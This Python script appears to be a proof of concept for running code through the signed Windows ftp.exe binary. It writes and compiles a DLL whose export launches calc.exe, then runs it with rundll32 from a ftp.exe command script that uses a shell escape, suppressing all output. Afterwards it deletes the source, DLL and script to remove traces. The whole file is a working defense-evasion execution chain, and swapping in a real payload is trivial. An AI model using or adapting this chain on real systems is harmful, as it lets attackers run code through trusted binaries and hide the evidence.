import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

WORK_DIR = r"C:\Temp\FtpExploit"
VARSALL_BAT = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
CL_EXE = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe"

DLL_SRC = "test.c"
DLL_DEF = "test.def"
RUN_DLL_PATH = os.path.join(WORK_DIR, "test.dll")
FTP_EXE = r"C:\Windows\System32\ftp.exe"
FTP_SCRIPT = os.path.join(WORK_DIR, "ftpcommands.txt")

def write_sources():
    os.makedirs(WORK_DIR, exist_ok=True)
    with open(os.path.join(WORK_DIR, DLL_SRC), "w", encoding="utf-8") as f:
        f.write(r'''#include <windows.h>
#include <stdlib.h>

__declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    system("calc.exe");
}
''')
    with open(os.path.join(WORK_DIR, DLL_DEF), "w", encoding="utf-8") as f:
        f.write(r'''LIBRARY test
EXPORTS
    EntryPoint
''')

def build_dll():
    cmd = (
        f'"{VARSALL_BAT}" x64 && '
        f'"{CL_EXE}" /nologo /LD "{DLL_SRC}" /link /DEF:"{DLL_DEF}" /OUT:"{RUN_DLL_PATH}"'
    )
    subprocess.run(
        cmd,
        cwd=WORK_DIR,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )
    if not os.path.exists(RUN_DLL_PATH):
        raise FileNotFoundError(RUN_DLL_PATH)
    return RUN_DLL_PATH

def write_ftp_commands_for_rundll32(dll_path: str):
    dll_q = f'"{dll_path}"'
    lines = [
        'prompt off',
        f'!cmd /c rundll32 {dll_q},EntryPoint',
        'quit'
    ]
    with open(FTP_SCRIPT, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(lines) + "\n")

def run_via_ftp_script():
    if not os.path.exists(FTP_EXE):
        raise FileNotFoundError(FTP_EXE)
    if not os.path.exists(FTP_SCRIPT):
        raise FileNotFoundError(FTP_SCRIPT)
    
    subprocess.run(
        [FTP_EXE, "-n", f"-s:{FTP_SCRIPT}"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False
)

def cleanup_workdir():
    for path in [FTP_SCRIPT, RUN_DLL_PATH, os.path.join(WORK_DIR, DLL_SRC), os.path.join(WORK_DIR, DLL_DEF)]:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception:
            pass
    try:
        time.sleep(0.5)
        os.rmdir(WORK_DIR)
    except OSError:
        try:
            shutil.rmtree(WORK_DIR, ignore_errors=True)
        except Exception:
            pass

if __name__ == "__main__":
    write_sources()
    try:
        dll = build_dll()
    except subprocess.CalledProcessError:
        sys.exit(1)
    write_ftp_commands_for_rundll32(dll)
    run_via_ftp_script()

    time.sleep(0.5)
    cleanup_workdir()
